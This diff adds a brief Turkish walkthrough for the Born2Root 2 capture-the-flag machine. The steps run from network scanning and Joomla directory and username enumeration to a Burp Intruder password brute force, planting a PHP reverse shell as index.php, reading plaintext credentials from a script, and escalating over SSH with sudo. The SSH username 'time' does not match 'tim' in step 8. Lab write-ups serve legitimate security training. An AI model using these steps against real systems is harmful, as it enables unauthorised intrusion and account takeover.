@@ -1,0 +1,11 @@
+BORN2ROOT 2 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.70
+2 - nmap -sT -A 192.168.2.70
+3 - gobuster dir -u http://192.168.2.70 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+4 - joomscan -u http://192.168.2.70
+5 - cewl http://192.168.2.70/joomla/ > boot2root2_cewl.txt
+6 - http://192.168.2.70/joomla/administrator/ -> Burp Suite -> Intruder -> admin:travel
+7 - cp /usr/share/webshells/php/php-reverse-shell.php -> index.php
+8 - cat /opt/scripts/fileshare.py, localhost(tim):lulzlol
+9 - ssh time@192.168.2.70
+10 - sudo -l, sudo su
